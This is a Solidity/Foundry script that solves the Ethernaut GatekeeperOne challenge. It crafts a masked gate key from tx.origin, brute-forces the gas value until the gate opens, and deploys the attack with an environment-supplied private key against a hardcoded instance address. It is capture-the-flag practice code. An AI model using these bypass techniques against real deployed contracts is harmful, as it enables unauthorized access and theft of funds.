// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/gatekeeperone.sol";

contract GatekeeperOneAttack {
    GatekeeperOne public gatekeeper;

    constructor(address _gatekeeperAddress) {
        gatekeeper = GatekeeperOne(_gatekeeperAddress);
    }

    function attack() external {
        // Craft the gateKey
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;

        // Brute force the gas amount
        for (uint256 i = 0; i < 300; i++) {
            uint256 gasToUse = i + (8191 * 3);
            try gatekeeper.enter{gas: gasToUse}(gateKey) {
                break;
            } catch {}
        }
    }
}

contract gatekeeperScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        GatekeeperOneAttack attack = new GatekeeperOneAttack(
            0x195885760Ec3481384bc13D2F4530133DC091450
        );
        attack.attack();
        vm.stopBroadcast();
    }
}
